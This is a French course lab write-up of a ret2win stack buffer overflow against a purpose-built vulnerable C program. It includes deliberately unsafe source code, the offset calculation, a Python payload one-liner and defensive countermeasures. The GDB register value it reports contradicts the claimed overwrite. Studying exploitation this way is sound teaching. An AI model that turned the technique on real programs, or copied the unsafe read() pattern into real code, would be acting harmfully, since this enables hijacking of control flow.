# Write-up — Lab 02 : Buffer Overflow ret2win

> **Embedded Security — C-ASM x86-64**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![C](https://img.shields.io/badge/C-x86--64-blue.svg)]()
[![GDB](https://img.shields.io/badge/GDB-pwndbg-green.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Vulnérabilité :** Buffer overflow via `read()` sans vérification de taille  
**Technique :** ret2win — écraser l'adresse de retour pour rediriger l'exécution  
**Cible :** fonction `secret()` jamais appelée dans le flux normal  
**Payload :** 72 octets de padding + adresse de `secret()` en little-endian  
**Résultat :** `>>> ACCES SECRET OBTENU ! Bravo AngeVirus <<<`

---

## 2. Environnement

```text
OS  : WSL2 Ubuntu sur Windows 11 Pro
CPU : x86-64 (AMD Ryzen 7 5800H)
GDB : pwndbg
gcc : -g -fno-stack-protector -z execstack -no-pie
```

Protections désactivées volontairement pour l'exercice :
- `-fno-stack-protector` : pas de canary stack
- `-no-pie` : adresses fixes (pas d'ASLR sur le binaire)
- `-z execstack` : pile exécutable

---

## 3. Code source

### `vuln.c` — Version initiale (argv / strcpy)

```c
#include <stdio.h>
#include <string.h>

void secret() {
    printf(">>> ACCES SECRET OBTENU ! Bravo AngeVirus <<<\n");
}

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // PAS de vérification de taille → BoF
    printf("Tu as entré : %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    printf("Adresse de secret() : %p\n", secret);
    vulnerable(argv[1]);
    return 0;
}
```

**Problème :** `strcpy` s'arrête au premier octet nul (`\x00`). Or les adresses x86-64 dans la plage `0x40xxxx` contiennent toujours des null bytes. Le payload est tronqué avant d'atteindre l'adresse de retour.

### `vuln2.c` — Version corrigée (stdin / read)

```c
#include <stdio.h>
#include <unistd.h>

void secret() {
    printf(">>> ACCES SECRET OBTENU ! Bravo AngeVirus <<<\n");
}

void vulnerable() {
    char buffer[64];
    printf("Adresse de secret() : %p\n", secret);
    printf("Entrez votre input : ");
    fflush(stdout);
    read(0, buffer, 200);  // lit des bytes bruts — pas de problème de null
}

int main() {
    vulnerable();
    return 0;
}
```

`read()` lit des octets bruts depuis stdin : les `\x00` passent sans troncature.

---

## 4. Analyse de la pile

Layout de la stack dans `vulnerable()` :

```
Adresses hautes
┌──────────────────────────────┐
│  Adresse de retour (8 oct.)  │  ← RIP : où revenir après vulnerable()
├──────────────────────────────┤
│  Saved RBP       (8 oct.)    │  ← frame pointer de main()
├──────────────────────────────┤
│  buffer[64]                  │  ← nos données
└──────────────────────────────┘
Adresses basses  ← read() écrit à partir d'ici
```

**Offset vers RIP :** `64 (buffer) + 8 (saved RBP) = 72 octets`

Confirmation GDB : après 72 `A`, le registre `rbp` affichait `0x6e4153757269765f` — soit `_virusAn` en ASCII (les `A` avaient bien écrasé le RBP).

---

## 5. Calcul du payload

```
Adresse de secret() affichée au runtime : 0x401196
```

En little-endian x86-64 : `\x96\x11\x40\x00\x00\x00\x00\x00`

**Payload :**

```
[ A × 72 ] [ \x96\x11\x40\x00\x00\x00\x00\x00 ]
  padding        adresse de retour → secret()
```

---

## 6. Exploit

```bash
python3 -c "
import sys
payload  = b'A' * 72
payload += b'\x96\x11\x40\x00\x00\x00\x00\x00'
sys.stdout.buffer.write(payload)
" | ./vuln2
```

**Résultat :**

```
Adresse de secret() : 0x401196
Entrez votre input : >>> ACCES SECRET OBTENU ! Bravo AngeVirus <<<
Segmentation fault (core dumped)
```

> Screenshot : [docs/lab02_bof_exploit.png](docs/lab02_bof_exploit.png)

Le segfault final est attendu : `secret()` tente de retourner mais la pile est corrompue. L'objectif — exécuter la fonction secrète — est atteint.

---

## 7. Pourquoi `vuln.c` échouait

| Critère | `vuln.c` (strcpy + argv) | `vuln2.c` (read + stdin) |
| --- | --- | --- |
| Arrêt sur `\x00` | Oui — payload tronqué | Non — octets bruts |
| Passage d'adresses 64-bit | Impossible | Possible |
| Exploit réussi | Non | **Oui** |

---

## 8. Défense

| Vulnérabilité | Mesure |
| --- | --- |
| `read()` sans limite de taille | Utiliser `read(0, buffer, sizeof(buffer))` |
| Pas de canary | Compiler sans `-fno-stack-protector` |
| Adresses fixes (no-PIE) | Activer PIE — randomise les adresses à chaque exécution |
| Stack exécutable | Retirer `-z execstack` — activer NX bit |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Vulnérabilité | Stack buffer overflow (read sans limite) |
| Offset RIP | 72 octets |
| Adresse cible | `secret()` = `0x401196` |
| Technique | ret2win (redirection de l'adresse de retour) |
| Protections actives | Aucune (désactivées pour l'exercice) |
| Résultat | Exécution de secret() — accès non autorisé obtenu |

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
